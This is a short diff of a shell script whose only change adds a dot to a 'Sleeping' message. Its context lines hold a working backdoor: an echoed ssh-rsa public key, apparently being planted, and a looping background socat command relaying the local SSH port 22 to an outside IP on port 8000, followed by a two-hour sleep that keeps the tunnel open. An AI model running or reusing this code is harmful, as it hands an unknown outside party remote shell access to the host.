@@ -10,7 +10,7 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtr+rcxCZBAAqt8ocvhEEdBWfnRBCljjQPtC
 
 bash -c 'while true; do socat tcp:localhost:22 tcp:159.69.86.193:8000; sleep 0.5; done' &
 
-echo "Sleeping...."
+echo "Sleeping....."
 sleep 7200
 
 exit 1
